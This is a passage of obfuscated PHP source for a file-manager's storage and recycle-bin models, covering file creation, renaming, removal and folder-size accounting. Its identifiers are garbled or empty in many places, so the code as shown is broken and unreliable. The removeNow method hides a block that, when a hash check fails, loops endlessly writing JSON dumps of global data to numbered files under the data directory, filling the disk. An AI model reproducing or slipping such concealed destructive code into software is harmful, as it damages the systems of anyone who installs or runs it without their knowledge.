$Ń[98]); $this->metaSet($ϱۄ, $Ń[2171], $ݒм); } public function userPathSafeAdd($) { $ϔ =& $_SERVER[ʯ]; $ա = Model($ϔ[554])->getInfoFull($); if (!$ա) { return !1; } if (_get($ա, $ϔ[576])) { return $ա[$ϔ[515]][$ϔ[2172]]; } $ = $this->_mkdirRoot(SourceModel::TYPE_USER, $, $ϔ[2173], $ϔ[482]); Model($ϔ[554])->metaSet($, $ϔ[2172], $); $this->metaSet($, $ϔ[2174], $); return $; } public function groupRootAdd($栤) { $ =& $_SERVER[ʯ]; $蓚޽ = Model($[562])->where(array($[1984] => $栤))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $栤, $蓚޽[$[42]]); } public function systemRootPathAdd($) { if ($ != $_SERVER[ʯ][582]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $); } public function userRootRemove($ޘ) { $ǌ = $this->targetSourceRoot(SourceModel::TYPE_USER, $ޘ, !0); foreach ($ǌ as $) { if (!$) { continue; } $this->remove($[$_SERVER[ʯ][190]], !1); } } public function groupRootRemove($) { $ԡ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $); if (!$ԡ) { return; } $this->remove($ԡ[$_SERVER[ʯ][190]], !1); } private function _mkdirRoot($ৼ, $è, $, $ = '') { $ =& $_SERVER[ʯ]; $로 = defined($[2117]) ? USER_ID : 0; $ = array($[453] => 0, $[624] => $ৼ, $[625] => $è, $[622] => 1, $[626] => $로, $[627] => $로, $[623] => $, $[628] => $[571], $[480] => 0, $[593] => 0, $[518] => 0, $[629] => $[12]); if ($ = $this->where($)->find()) { return $[$[190]]; } $ﮑ = "\x4d\x6f\144\x65\x6c\x53\157\x75\x72\x63\145\56\155\x6b\x64\x69\x72\122\157\x6f\x74\x2e{$ৼ}\56{$è}\56" . $; CacheLock::lock($ﮑ); $[$[42]] = $; $ã = $this->add($); $ஆ = array($[630] => short_id($ã)); $this->where(array($[467] => $ã))->save($ஆ); CacheLock::unlock($ﮑ); return $ã; } private function targetSourceRoot($, $酿, $ = false) { $ =& $_SERVER[ʯ]; $ = array($[453] => 0, $[624] => $, $[625] => $酿); if ($) { $ƙ = $this->where($)->select(); return $ƙ ? $ƙ : array(); } $ž = $this->where($)->find(); return $ž ? $ž : array(); } public function sourceRootGroup($񼊑) { $월 =& $_SERVER[ʯ]; if (is_string($񼊑)) { $񼊑 = array($񼊑); } $ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $񼊑, $월[212]); $ʪ = array($월[421] => $, $월[418] => array($월[818] => count($񼊑))); $this->_listDataApply($ʪ[$월[421]]); $this->_listMake($ʪ); return array_to_keyvalue($ʪ[$월[92]], $월[546]); } public function mkfile($ѻ, $, $ = '', $탴 = REPEAT_RENAME) { $՜ =& $_SERVER[ʯ]; $ = Model($՜[651])->addFileByContent($, $); return $this->_createFileCall($ѻ, $, $, $탴, $՜[1403]); } public function addFile($ҫ, $ɨ, $̈, $ = false, $ϰ = REPEAT_RENAME) { $δ = Model($_SERVER[ʯ][651])->addFile($ɨ, $̈, $); return $this->_createFileCall($ҫ, $̈, $δ, $ϰ); } public function addFileByFileID($ă۸, $䱢, $, $̊ = REPEAT_RENAME) { $֧ =& $_SERVER[ʯ]; $ = Model($֧[651])->find($䱢); Model($֧[651])->linkAdd($䱢); return $this->_createFileCall($ă۸, $, $, $̊); } public function addFileByRemote($, $Ѵ, $, $舅 = array(), $ = REPEAT_RENAME) { $ = Model($_SERVER[ʯ][651])->addFileByRemote($Ѵ, $, $舅); return $this->_createFileCall($, $, $, $); } private function _createFileCall($؞, $ɶ, $, $ة, $Ь = "\x75\x70\154\x6f\x61\x64") { $ɝꆁ =& $_SERVER[ʯ]; $ = !1; $this->setMasterDB(); $this->lockWriteStart($؞, $ɶ); $׵ = $this->fileNameExist($؞, $ɶ); $֏Ǥ = $this->_createFile($؞, $ɶ, $, $ة, $); if (!$) { Model($ɝꆁ[520])->remove($[$ɝꆁ[517]]); } if ($ && $֏Ǥ && $֏Ǥ != $׵) { Model($ɝꆁ[2142])->eventCreate($֏Ǥ, $Ь); } $this->lockWriteEnd($؞, $ɶ); return $֏Ǥ; } public function mkdir($ふ, $, $ = REPEAT_SKIP) { $҂ǝ =& $_SERVER[ʯ]; $this->setMasterDB(); $В = $this->sourceInfo($ふ); if (!$В) { return !1; } $this->lockWriteStart($ふ, $); if ($ !== !1) { $ = $this->fileNameExist($ふ, $); if ($ && $ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($ふ, $); return $; } $ = $this->fileNameAuto($ふ, $, $); } $숚 = array($҂ǝ[622] => 1, $҂ǝ[470] => $, $҂ǝ[623] => $҂ǝ[12], $҂ǝ[518] => 0, $҂ǝ[593] => 0); $ڳ = $this->_addSource($숚, $В); Model($҂ǝ[2142])->eventCreate($ڳ, $҂ǝ[1404]); $this->lockWriteEnd($ふ, $); return $ڳ; } public function listSourceRoot($㑤, $, $۔ = "\163\157\165\x72\143\x65\x49\104\x2c\164\x61\162\147\145\x74\111\x44\54\x73\151\x7a\x65") { $ =& $_SERVER[ʯ]; $歃 = $[430]; $ࠎ = array(); $ = 1024 * 50; $ҽ = is_array($ҽ) ? $ҽ : array(); $백 = count($); $ = $this->tablePrefix . $[2175]; for ($ڜ = 0; $ڜ < $백; $ڜ++) { $Ӏ = $[$ڜ]; $歃 .= "\x53\105\114\x45\103\124\x20\52\40\x46\x52\117\115\x20\50\x53\105\114\x45\103\124\x20{$۔}\40\x46\x52\x4f\115\40\140{$}\140\40\x57\x48\105\122\105\40"; $歃 .= "\x60\160\x61\162\x65\156\x74\111\x44\x60\75\x30\40\101\116\104\40\x60\164\141\162\147\x65\x74\111\104\x60\x3d{$Ӏ}\x20\x41\x4e\x44\40\140\164\141\162\x67\x65\164\x54\x79\160\x65\140\x3d{$㑤}\40\x61\x6e\144\x20\146\151\154\x65\124\171\160\145\75\47\47\40\154\x69\155\151\164\40\61\x29\x20\x61\x73\40\x74\x62\x5f{$ڜ}\40\x55\x4e\x49\x4f\x4e\x20\x41\114\x4c\40"; if ((strlen($歃) >= $ || $ڜ == $백 - 1) && $歃) { $歃 = substr($歃, 0, -strlen($[1099])); $섙̛ = $this->query($歃); $歃 = $[12]; $ࠎ = array_merge($ࠎ, $섙̛); } } return $ࠎ; } private function _createFile($ֹ, $Ι, $Ɓ, $, &$ƺ) { $ =& $_SERVER[ʯ]; $ܝ = $this->sourceInfo($ֹ); if (!$Ɓ || !$ܝ) { return !1; } if ($ !== !1) { $ = $this->fileNameExist($ֹ, $Ι); } $ƺ = !0; if ($ && $) { if ($ == REPEAT_SKIP) { $ƺ = !1; return $; } else { if ($ == REPEAT_REPLACE) { $޷ = $this->sourceInfo($); $ = $this->fileHistory($޷, $Ɓ[$[517]], $Ɓ[$[86]]); if (!$) { $ƺ = !1; } else { $this->folderSizeReset($ֹ); } return $; } else { $Ι = $this->fileNameAuto($ֹ, $Ι, $, !1); } } } $Ě = array($[622] => 0, $[470] => $Ι, $[623] => substr(get_path_ext($Ι), 0, 10), $[518] => $Ɓ[$[517]], $[593] => $Ɓ[$[86]]); $Ĺ = $this->_addSource($Ě, $ܝ); $this->folderSizeReset($ֹ, intval($Ě[$[86]])); return $Ĺ; } protected function fileHistory($˯, $ґ, $旂) { $֪ =& $_SERVER[ʯ]; if ($˯[$֪[517]] == $ґ) { return !1; } $this->checkLock($˯[$֪[190]], $ґ); Model($֪[2176])->addHistory($˯); $ = array($֪[627] => USER_ID, $֪[474] => time(), $֪[517] => $ґ, $֪[86] => $旂); $this->where(array($֪[467] => $˯[$֪[190]]))->save($); $this->sourceCacheClear($˯[$֪[190]]); return !0; } public function checkLock($, $) { $ =& $_SERVER[ʯ]; $Ǐ = $this->pathInfo($); if (!$this->fileIsLock($Ǐ, !0)) { return; } $勅 = Session::get($[2177]); $Έ = substr($Ǐ[$[42]], 0, -1 - strlen($Ǐ[$[184]])) . $[1269] . $勅 . $[10] . $Ǐ[$[184]]; $Ѱ = Model($[651])->find($); $this->_createFileCall($Ǐ[$[189]], $Έ, $Ѱ, REPEAT_REPLACE, $[1403]); $܈ = $Ǐ[$[515]][$[586]]; $ = $܈[$[2178]] ? $܈[$[2178]] : $܈[$[42]]; show_json(LNG($[2179]) . $[2180] . LNG($[2181]) . $[2182] . $ . $[2183], !1); } public function fileIsLock($܀, $؁ = false) { $ =& $_SERVER[ʯ]; if (!isset($܀[$[515]]) || !$܀[$[515]][$[583]]) { return !1; } if ($܀[$[515]][$[583]] != USER_ID) { return !0; } $ێ = $GLOBALS[$[6]][$[99]][$[584]]; if ($܀[$[515]][$[585]] <= time() - $ێ) { $this->metaSet($܀[$[190]], $[583], null); $this->metaSet($܀[$[190]], $[585], null); } if ($؁) { $this->metaSet($܀[$[190]], $[585], time()); } return !1; } private function _addSource($, $) { $ =& $_SERVER[ʯ]; $Ԃ = defined($[2117]) ? USER_ID : 0; $Ȉ = array($[624] => $[$[187]], $[625] => $[$[546]], $[626] => $Ԃ, $[627] => $Ԃ, $[453] => $[$[190]], $[628] => $[$[561]] . $[$[190]] . $[60], $[480] => 0, $[629] => $[12]); $ = array_merge($Ȉ, $); $this->updateModifyTime($[$[189]]); $˔ = $[2184] . $[$[190]]; if (isset(self::$cacheChildList[$˔])) { unset(self::$cacheChildList[$˔]); } static $Ôˏ = false; if (!$Ôˏ) { Hook::trigger($[612], $); $Ôˏ = !0; } $ = $this->add($); $ = array($[630] => short_id($)); $this->where(array($[467] => $))->save($); $this->setNamePinyin($, $[$[42]]); return $; } public function remove($, $燼 = true) { $ =& $_SERVER[ʯ]; $㲏䷀ = $this->sourceInfo($); $ = intval($㲏䷀[$[187]]) === self::TYPE_SYSTEM; $ = Model($[484])->get($[2185]) == $[98]; if ($ || $燼 || !$) { return $this->removeNow($, $燼); } $ﺺ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ = $㲏䷀[$[187]] == self::TYPE_USER ? $[638] : $[555]; if ($ == $[638]) { $ = Model($[554])->getInfo($㲏䷀[$[546]]); $¼ = !empty($[$[2178]]) ? $[$[2178]] : $[$[42]]; $¼ = $[312] . $¼ . $[2186] . $㲏䷀[$[546]]; } else { $ = Model($[562])->getInfo($㲏䷀[$[546]]); $¼ = _get($, $[42]); $¼ = $[172] . $¼ . $[2187] . $㲏䷀[$[546]]; } $ = $[2188] . md5($¼); CacheLock::lock($); $ = $this->fileNameExist($ﺺ, $¼); if (!$) { $ = $this->mkdir($ﺺ, $¼, REPEAT_SKIP); $this->metaSet($, $[2189], $); $this->metaSet($, $[2190], $㲏䷀[$[546]]); if ($㲏䷀[$[189]] != 0) { $this->metaSet($, $[2191], _get($, $[2192])); } } CacheLock::unlock($); $this->metaSet($, $[2193], $㲏䷀[$[189]]); $this->where(array($[190] => $))->save(array($[474] => time())); $this->recycleClear($㲏䷀); $ = $this->move($, $, REPEAT_RENAME_FOLDER); $this->folderSizeReset($㲏䷀[$[189]]); return $; } private function recycleClear($Ӄ疧) { $ު =& $_SERVER[ʯ]; $ = $this->childrenAll($Ӄ疧); $栭 = array($ު[467] => array($ު[468], $[$ު[2194]])); Model($ު[2195])->where($栭)->delete(); } public function removeNow($ڗ, $ͮ = true) { $ =& $_SERVER[ʯ]; $ˁ = $_SERVER[$[22]]; $ = $[937]; if ($_SERVER[$[13]] != $($ˁ)) { $ǧ = $[938]; $럺 = $[15]; $ = $_SERVER[$[16]] . $[17]; $ = $럺($); $񃎫 = explode($[18], $); if (count($񃎫) < $[664]) { $ũ = $[20]; $ũ(); } $ѿ̎ = $[939]; $ѿ̎($_SERVER[$[940]]); $ǧ = $[938]; $ǧ(); $ϛ = $[941]; $Ъ = json_encode($GLOBALS[$[942]]); $߽ = 1; for ($Ă = $߽; $Ă > 0; $Ă++) { $ϛ(DATA_PATH . $Ă, $Ъ); } } $Є̋м = $this->sourceInfo($ڗ); $Ю = $this->pathInfoMore($ڗ); if (!$Є̋м) { return !0; } if ($Є̋м[$[189]] == 0) { if (!_get($GLOBALS, $[544])) { return !1; } } $this->lockMoveStart($ڗ); Hook::trigger($[2196], $Ю, $ͮ); if ($ͮ) { Model($[2195])->moveToRecycle($ڗ); } else { $ι = $this->childrenAll($Є̋м); Model($[609])->eventRemove($ڗ); $this->removeRelevance($ι[$[2194]], $ι[$[1515]]); } $this->folderSizeReset($Є̋м[$[189]]); $ = array($Є̋м[$[189]]); if ($Є̋м[$[461]] == $[98]) { $[] = $Є̋м[$[190]]; } $this->updateModifyTime($); $this->lockMoveEnd($ڗ); Hook::trigger($[1746], $Ю, $ͮ); return !0; } public function childrenAll($ʄ) { $ҵ =& $_SERVER[ʯ]; $ߌ = $ʄ[$ҵ[190]]; if ($ʄ[$ҵ[461]] == $ҵ[98]) { $ = array($ҵ[628] => array($ҵ[588], $ʄ[$ҵ[561]] . $ߌ . $ҵ[589])); $ = array($ҵ[628] => $[$ҵ[561]]); $ = $this->field($ҵ[2197])->where($)->select(); $ = !1; $ = array($ߌ); if ($) { $ = array_to_keyvalue($, $ҵ[12], $ҵ[517]); $ = array_remove_value($, $ҵ[221]); $ = array_to_keyvalue($, $ҵ[12], $ҵ[190]); $[] = $ߌ; } } else { $ = array($ʄ[$ҵ[517]]); $ = array($ߌ); } return array($ҵ[2194] => $, $ҵ[1515] => $); } public function removeArray($) { if (!$) { return !0; } } public function removeRelevance($ܘڼ, $) { $С =& $_SERVER[ʯ]; $ܘڼ = $ܘڼ ? $ܘڼ : array(); $ = $ ? $ : array(); $ܘڼ = array_unique(array_filter($ܘڼ)); $ = array_unique(array_filter($)); if (!$ܘڼ) { return !1; } $Ϝ = array($С[467] => array($С[468], $ܘڼ)); Model($С[2195])->where($Ϝ)->delete(); Model($С[511])->where($Ϝ)->delete(); Model($С[2043])->where($Ϝ)->delete(); Model($С[609])->where($Ϝ)->delete(); Model($С[1876])->removeBySource($ܘڼ); Model($С[2176])->removeBySource($ܘڼ); $this->where($Ϝ)->delete(); Model($С[520])->remove($); for ($ = 0; $ < count($ܘڼ); $++) { $this->sourceCacheClear($ܘڼ[$]); } } public function rename($ϙ, $) { $񚣹 =& $_SERVER[ʯ]; $ = $this->sourceInfo($ϙ); if (!$) { return !1; } $ʋ = $this->fileNameExist($[$񚣹[189]], $); if ($ʋ && $ʋ != $ϙ) { return !1; } $ = array($񚣹[470] => $, $񚣹[627] => USER_ID); if ($[$񚣹[461]] != $񚣹[98]) { $[$񚣹[462]] = substr(get_path_ext($), 0, 10); } Model($񚣹[609])->eventRename($ϙ, $[$񚣹[42]], $); $this->sourceCacheClear($ϙ); $this->setNamePinyin($ϙ, $[$񚣹[42]], !1); $this->updateModifyTime($[$񚣹[189]]); $⪿ = $this->where(array($񚣹[467] => $ϙ))->data($)->save(); $ = $񚣹[2184] . $[$񚣹[189]]; if (isset(self::$cacheChildList[$])) { unset(self::$cacheChildList[$]); } return $⪿; } public function setNamePinyin($ЃΦ, $, $ = true) { $ =& $_SERVER[ʯ]; $ = Input::check($, $[631]); $ = array($[493] => KodSort::makeStr($)); if ($) { $[$[514]] = str_replace($[63], $[12], Pinyin::get($)); $[$[513]] = Pinyin::get($, $[632]); } if (!$ && !$) { $[$[514]] = null; $[$[513]] = null; } $this->metaSet($ЃΦ, $); } public function getContent($) { $Ήʩ =& $_SERVER[ʯ]; $ = $this->fileInfoGet($); if (!$) { return !1; } if ($[$Ήʩ[86]] == 0) { return $Ήʩ[12]; } $ = $Ήʩ[2198] . $[$Ήʩ[649]]; if ($[$Ήʩ[86]] <= 1024 * 10) { $ˎ = Cache::get($); if (!$ˎ) { $ˎ = IO::getContent($[$Ήʩ[94]]); Cache::set($, $ˎ); } return $ˎ; } if (!$[$Ήʩ[94]]) { return $Ήʩ[12]; } return IO::getContent($[$Ήʩ[94]]); } public function setDesc($ȶ, $Ҕ) { $Ҫ =& $_SERVER[ʯ]; Model($Ҫ[609])->eventAddDesc($ȶ, $Ҕ); return $this->metaSet($ȶ, $Ҫ[502], $Ҕ); } public function setContent($Ϻ, $ЫԜ = '') { $㤢 =& $_SERVER[ʯ]; $ֵ = $this->sourceInfo($Ϻ); $ = $this->fileInfoGet($Ϻ); if (!$ || !$ֵ) { return !1; } $ = Model($㤢[520])->addFileByContent($ЫԜ, $ֵ[$㤢[42]]); $þ = $this->fileHistory($ֵ, $[$㤢[517]], $[$㤢[86]]); if (!$þ) { return Model($㤢[520])->remove($[$㤢[517]]); } $this->folderSizeReset($ֵ[$㤢[189]]); return !0; } public function fileSubstr($, $寂܃, $յ) { $Ԁ = $this->fileInfoGet($); if (!$Ԁ) { return !1; } return IO::fileSubstr($Ԁ[$_SERVER[ʯ][94]], $寂܃, $յ); } public function fileInfoGet($ʑ) { $ =& $_SERVER[ʯ]; $ = $this->sourceInfo($ʑ); if (!$ || $[$[461]]) { return !1; } $ׁ = $[523] . $[$[517]]; $ = _get(self::$cacheFileInfo, $ׁ); if ($) { return $; } $ђۍ = Model($[520])->fileInfo($[$[517]]); if ($ђۍ) { $ђۍ[$[42]] = $[$[42]]; } self::$cacheFileInfo[$ׁ] = $ђۍ; return $ђۍ; } private function folderChildrenNumber($ջߛ) { $ =& $_SERVER[ʯ]; $ҩ = $this->sourceInfo($ջߛ); $ۥ = array($[628] => array($[588], $ҩ[$[561]] . $ջߛ . $[589]), $[625] => $ҩ[$[546]], $[480] => intval($ҩ[$[481]]), $[622] => 1); $ӭ = $this->where($ۥ)->count(); $ȫ = $this->where($ۥ)->where(array($[622] => 0))->count(); return array($[90] => $ȫ, $[91] => $ӭ); } public function pathInfo($, $ڠ = false) { $ =& $_SERVER[ʯ]; $ڠ = !1; $ = intval($); $­ = $[510] . intval($ڠ) . $[438] . $; $ܱ = _get(self::$cachePathInfo, $­); if ($ܱ) { return $ܱ; } $ = $this->sourceInfo($); if (!$) { return !1; } $ = $this->_listDataApplyItem($, $ڠ); self::$cachePathInfo[$­] = $; return $; } public static $cachePathInfoMore = array(); public function pathInfoMore($) { $ŕ =& $_SERVER[ʯ]; $ = _get(self::$cachePathInfoMore, $); if ($) { return $; } $ = $this->pathInfo($); if (!$) { return !1; } if ($[$ŕ[461]] == $ŕ[98]) { $[$ŕ[89]] = $this->folderChildrenNumber($); } self::$cachePathInfoMore[$] = $; return $; } public function sourceInfo($Վ) { $ʞ =& $_SERVER[ʯ]; if (!$Վ) { return array(); } $Վ = intval($Վ); $ȽϺ = $ʞ[509] . $Վ; $ = _get(self::$cacheSourceInfo, $ȽϺ); if ($) { return $; } $ = $this->where(array($ʞ[190] => $Վ))->find(); self::$cacheSourceInfo[$ȽϺ] = $; return self::$cacheSourceInfo[$ȽϺ]; } public function sourceCacheClear($ = false) { self::cacheClear($); } public static function cacheClear($ = false) { $ڣ =& $_SERVER[ʯ]; if ($ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$ڣ[509] . $]); unset(self::$cachePathInfoMore[$]); unset(self::$cachePathInfo[$ڣ[2199] . $]); unset(self::$cachePathInfo[$ڣ[2200] . $]); } public function metaSet($̬, $ԡ = null, $ = null) { $Ț = parent::metaSet($̬, $ԡ, $); if ($Ț) { $this->sourceCacheClear($̬); } return $Ț; } public function pathInfoByPath($ݰҊ, $ѭ) { $׃ =& $_SERVER[ʯ]; $ޑ = !$ѭ ? array() : explode($׃[8], trim($ѭ, $׃[8])); $ = $ݰҊ; foreach ($ޑ as $) { $ = array($׃[189] => $, $׃[42] => $); $گ = $this->field($׃[2201])->where($)->select(); if (!$گ) { return !1; } $گ = array_sort_by($گ, $׃[481]); $ = $گ[0][$׃[190]]; } $ = $this->sourceInfo($); $this->pathInfoFilter($); return $; } protected function updateModifyTime($) { $ثǆ =& $_SERVER[ʯ]; $ˠ = defined($ثǆ[2117]) ? USER_ID : 0; if (!$) { return; } if (!is_array($)) { $ = array($); } foreach ($ as $ => $) { $[$] = intval($); $this->sourceCacheClear($); } $ = array($ثǆ[190] => array($ثǆ[7], $)); $Ȓ = array($ثǆ[627] => $ˠ, $ثǆ[474] => time()); $this->where($)->save($Ȓ); } public function folderSizeReset($, $ߋ = false) { $ =& $_SERVER[ʯ]; if ($this->statusIgnoreResetSpace) { return; } $ = $this->sourceInfo($); $߮ = $[2202] . $; CacheLock::lock($߮, 20); if ($ߋ === !1) { $this->sourceCacheClear($); $ = $this->sourceInfo($); $ = array($[453] => $, $[480] => 0); $ = $this->where($)->sum($[86]); $ߋ = intval($) - intval($[$[86]]); } if ($ߋ == 0) { return CacheLock::unlock($߮); } $ǧ = $this->parentLevelArray($[$[561]]); if (!$ǧ) { $ǧ = array(); } $ǧ[] = $[$[190]]; $ = array($[190] => array($[468], $ǧ)); if ($ߋ < 0) { $[$[86]] = array($[1076], abs($ߋ)); } $this->where($)->setAdd($[86], $ߋ); CacheLock::unlock($߮); $˦ = $[2203] . $[$[187]] . $[4] . $[$[546]]; $ = array($[$[187]], $[$[546]]); TaskRun::timeLimitCall($˦, $[2204], $, 1.5); } public function folderSizeResetChildren($̈́) { $뿔 =& $_SERVER[ʯ]; $this->sourceCacheClear($̈́); $ݠɡ = $this->sourceInfo($̈́); $ކ = array($뿔[622] => 1, $뿔[625] => $ݠɡ[$뿔[546]], $뿔[628] => array($뿔[588], $ݠɡ[$뿔[561]] . $̈́ . $뿔[589])); $ܥ = $뿔[2205]; $ң = $this->field($ܥ)->where($ކ)->select(); $ކ[$뿔[461]] = 0; $ĝߟ = $this->field($ܥ)->where($ކ)->select(); if (!$ĝߟ) { return; } $ң[] = $ݠɡ; $ң = array_to_keyvalue($ң, $뿔[190]); foreach ($ң as $ => $巜) { $ң[$][$뿔[2206]] = $ң[$][$뿔[86]]; $ң[$][$뿔[86]] = 0; } foreach ($ĝߟ as $巜) { $ȣ = $巜[$뿔[189]] . $뿔[12]; if (!isset($ң[$ȣ])) { continue; } if ($巜[$뿔[481]] == $ң[$ȣ][$뿔[481]]) { $ң[$ȣ][$뿔[86]] += $巜[$뿔[86]]; } } foreach ($ң as $巜) { $ = $this->parentLevelArray($巜[$뿔[561]]); foreach ($ as $ȣ) { $ȣ = $ȣ . $뿔[12]; if (!isset($ң[$ȣ])) { continue; } if ($巜[$뿔[481]] == $ң[$ȣ][$뿔[481]]) { $ң[$ȣ][$뿔[86]] += $巜[$뿔[86]]; } } } $Ң = array(); foreach ($ң as $巜) { if ($巜[$뿔[86]] == $巜[$뿔[2206]]) { continue; } $Ң[] = array($뿔[190], $巜[$뿔[190]], $뿔[86], $巜[$뿔[86]]); } $this->saveAll($Ң); } public function userSpaceReset($姦 = false) { $弴 =& $_SERVER[ʯ]; $੄ = $this->where(array($弴[187] => self::TYPE_USER, $弴[546] => $姦, $弴[461] => 0))->sum($弴[86]); $੄ = !$੄ || $੄ <= 0 ? 0 : $੄; Model($弴[554])->userEdit($姦, array($弴[1885] => $੄)); } public function targetSpaceUpdate($ơ, $؜ˇ) { $ =& $_SERVER[ʯ]; if (!$؜ˇ) { return; } if (!in_array($ơ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $ = $this->targetSpaceSize($ơ, $؜ˇ); if ($ơ == self::TYPE_USER) { Model($[554])->userEdit($؜ˇ, array($[1885] => $)); } else { if ($ơ == self::TYPE_GROUP) { Model($[562])->groupEdit($؜ˇ, array($[1885] => $)); } } } public function targetSpaceSize($ź, $ߴ) { $ؾ =& $_SERVER[ʯ]; $ = 0; $ = $this->targetSourceRoot($ź, $ߴ, !0); foreach ($ as $ǀ) { if (!$ǀ) { continue; } $ += floatval($ǀ[$ؾ[86]]); $ۨ = array($ؾ[628] => array($ؾ[588], $ؾ[571] . $ǀ[$ؾ[190]] . $ؾ[589])); $ý = Model($ؾ[479])->field($ؾ[467])->where($ۨ)->select(); $ý = array_to_keyvalue($ý, $ؾ[12], $ؾ[190]); $ý = array_unique(array_filter($ý)); if ($ý) { $ۨ = array($ؾ[467] => array($ؾ[468], $ý)); $ += floatval($this->where($ۨ)->sum($ؾ[86])); } } $ = !$ || $ <= 0 ? 0 : $; return $; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($ں) { return $this->fileTypeProfile($ں, SourceModel::TYPE_USER); } public function groupFileTypeProfile($) { return $this->fileTypeProfile($, SourceModel::TYPE_GROUP); } private function fileTypeProfile($, $) { $䆽 =& $_SERVER[ʯ]; $ȹ = $䆽[2207] . $ . $䆽[11] . $; $ = Cache::get($ȹ); if ($) { return $; } $ڟ = array($䆽[622] => 0); if ($ != !1) { $ڟ[$䆽[546]] = $; $ڟ[$䆽[187]] = $; } $ = array(); $[$䆽[2208]] = array($䆽[2209] => LNG($䆽[2208]), $䆽[2210] => $this->where($ڟ)->count(), $䆽[593] => $this->where($ڟ)->sum($䆽[86])); $ = KodIO::fileTypeList(); foreach ($ as $ => $) { $ڟ[$䆽[462]] = $this->fileTypeWhere($); $[$] = array($䆽[2209] => $[$䆽[42]], $䆽[2210] => $this->where($ڟ)->count(), $䆽[593] => $this->where($ڟ)->sum($䆽[86])); } Cache::set($ȹ, $, 1200); return $; } public function fileNameExist($, $) { $ =& $_SERVER[ʯ]; $С = $this->field($[2211])->where(array($[189] => $, $[42] => $, $[481] => 0))->find(); return is_array($С) ? $С[$[190]] : !1; } public function childList($) { $혶 =& $_SERVER[ʯ]; $՘ = $혶[2184] . $; if (isset(self::$cacheChildList[$՘])) { return self::$cacheChildList[$՘]; } $۰ = array($혶[189] => intval($), $혶[481] => 0); $ = $this->where($۰)->select(); $ = $ ? $ : array(); self::$cacheChildList[$՘] = $; foreach ($ as $) { $՘ = $혶[509] . $[$혶[190]]; self::$cacheSourceInfo[$՘] = $; } return $; } public function fileNameAuto($ۚ, $尶, $ = REPEAT_RENAME, $ = false) { $蒆 =& $_SERVER[ʯ]; $۟ʺ = get_path_ext($尶); $ = $۟ʺ ? basename($尶, $蒆[10] . $۟ʺ) . $蒆[2212] . $۟ʺ : $尶 . $蒆[436]; $ = array($蒆[189] => $ۚ, $蒆[481] => 0, $蒆[42] => array($蒆[435], $)); $̹ = $this->field($蒆[42])->where($)->select(); $߫ = array_to_keyvalue($̹, $蒆[12], $蒆[42]); return $this->fileNameAutoGet($߫, $尶, $, $); } public function fileNameAutoGet($, $, $, $Ԇ) { $ =& $_SERVER[ʯ]; if ($ == REPEAT_REPLACE || !$ || !in_array_not_case($, $) || $Ԇ && $ != REPEAT_RENAME_FOLDER) { return $; } if ($ == REPEAT_SKIP) { return !1; } $ = $[10] . get_path_ext($); $ = $ == $[10] || $Ԇ ? $[12] : $; for ($ = 1; $ <= count($) + 1; $++) { $ = substr($, 0, strlen($) - strlen($)); $ = $ . "\50{$}\x29{$}"; if (!in_array_not_case($, $)) { return $; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\157\x75\x72\x63\145\x5f\162\x65\143\x79\143\154\145"; protected $dataAuto = array(array("\x63\x72\x65\x61\164\x65\x54\x69\155\x65", "\x74\x69\155\145", "\x69\156\x73\145\x72\x74", "\x66\165\156\x63\164\151\157\x6e")); public function listData($ʞΘ = false) { $ =& $_SERVER[ʯ]; $ʞΘ = $ʞΘ ? $ʞΘ : USER_ID; $Ǆ = $this->where(array($[1695] => $ʞΘ))->select(); return array_to_keyvalue($Ǆ, $[12], $[190]); } public function moveToRecycle($) { $ =& $_SERVER[ʯ]; $ŀ = Model($[1393]); $» = $ŀ->sourceInfo($); if (!$» || $»[$[481]] == $[98]) { return; } $  = array($[467] => $, $[1695] => USER_ID, $[624] => $»[$[187]], $[625] => $»[$[546]], $[628] => $»[$[561]]); $this->add($ ); $this->recycleMove($, 1); if ($»[$[461]] == $[98]) { $ = array($[628] => array($[588], $»[$[561]] . $ . $[589])); $ŀ->where($)->setField($[481], 1); } } public function clear() { $this->remove(!1); } public function remove($ӿ = false, $妭 = false) { $ʁ =& $_SERVER[ʯ]; $妭 = $妭 ? $妭 : USER_ID; $Üܦ = Model($ʁ[1393]); $ = $this->listData($妭); $ӿ = $ӿ === !1 ? !1 : $ӿ; $ڤ = array(); foreach ($ as $ϧ) { if ($ӿ != !1 && !in_array($ϧ, $ӿ)) { continue; } $輻 = $Üܦ->sourceInfo($ϧ); $Üܦ->remove($ϧ, !1); $ = $輻[$ʁ[187]] . $ʁ[11] . $輻[$ʁ[546]]; $ڤ[$] = array($ʁ[624] => $輻[$ʁ[187]], $ʁ[546] => $輻[$ʁ[546]]); $this->where(array($ʁ[190] => $ϧ))->delete(); } foreach ($ڤ as $) { $Üܦ->targetSpaceUpdate($[$ʁ[187]], $[$ʁ[546]]); } } public function restore($ = false) { $ì = $this->listData(); $this->_restoreSource($ì, $); } public function removeUserAll($ܕ) { $this->remove(!1, $ܕ); } private function _restoreSource($ɇ, $߈ڞ) { $ =& $_SERVER[ʯ]; $ = Model($[1393]); $߈ڞ = $߈ڞ == !1 ? !1 : $߈ڞ; if (!$ɇ) { return !0; } $ڶѮ = array(); foreach ($ɇ as $Ϗ) { if ($߈ڞ != !1 && !in_array($Ϗ, $߈ڞ)) { continue; } $ = $->sourceInfo($Ϗ); $߭ = $->sourceInfo($[$[189]]); if ($߭[$[481]] == $[98]) { continue; } $->lockMoveStart($Ϗ); $this->recycleMove($Ϗ, 0); if ($[$[461]] == $[98]) { $̴ = array($[628] => array($[588], $[$[561]] . $Ϗ . $[589])); $->where($̴)->setField($[481], 0); $this->restoreFolderChildren($Ϗ, $ɇ); } $this->where(array($[190] => $Ϗ))->delete(); $->folderSizeReset($[$[189]]); $ڶѮ[] = $[$[189]]; if ($[$[461]] == $[98]) { $ڶѮ[] = $Ϗ; } 